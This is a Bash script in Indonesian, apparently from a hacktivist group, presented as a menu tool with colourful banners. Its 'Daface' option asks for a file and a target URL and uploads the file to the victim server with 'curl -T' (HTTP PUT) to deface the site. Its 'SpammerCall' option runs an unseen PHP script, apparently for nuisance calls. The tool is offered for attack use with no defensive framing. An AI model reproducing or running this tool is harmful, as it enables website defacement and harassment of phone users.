#Gila_coding                                                    green="\033[32;1m"                                              yellow="\033[33;1m"
indigo="\033[34;1m"
bagus="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
red="\033[1;31m"
green="\033[92m"
kuning="\033[93m"

mulai(){
clear
sleep 2
echo "$cyan"
toilet -f future "   DevlinCyberTeam"
echo "       $white<[=============== [$cyan Script $white] ================]>"
sleep 0.06
echo "$indigo<[============================================================]>"
sleep 2
echo "$bagus<[=================[$red Author : $purple Mr 4R13F $bagus]=====================]>"
sleep 0.04
echo "$bagus<[=================[$red Team   : $purple  Devlin  $bagus]=====================]>"
sleep 0.04
echo "$bagus<[=================[$kuning   AloneCyberTeam   $bagus]=====================]>"
sleep 0.1
echo "$indigo<[============================================================]>"
}

pilihan(){
echo ""
echo
sleep 2
echo "$white[1]$indigo Daface"
sleep 0.5
echo "$white[2]$indigo SpammerCall"
sleep 0.5
echo "$white[0]$indigo keluar\033[1;32m"
echo $cyan
echo "╭#@Root.By:Mr.1MP051B3L"
read -p "╰━⋗ Pilih nomor  : " nomor
}

mulai
pilihan

if [ $nomor = 1 ]; then
mulai
echo
echo
echo
echo $cyan"╭@Root.By:Mr.1MP051B3L"
read -p "╰━⋗ Script : " sc

echo ""

echo
echo
echo $cyan"╭@Root.By:Mr.1MP051B3L "
read -p "╰━⋗ Target : " target
echo "$cyan  sedang melaksanakan tugas"

curl -T /storage/emulated/0/$sc $target

echo "$indigo selesai melaksanakan tugas:)"

echo "$indigo<[============================================================]>"
echo ""
echo "$white  Silahkan cek $target/$sc"
echo ""
echo "$indigo<[============================================================]>"

fi

if [ $nomor = 2 ] || [ $nomor = 02 ]; then
mulai
echo
echo
echo $cyan
echo "╭@Root.ByMr.1MP051B3L"
php 1.php
fi
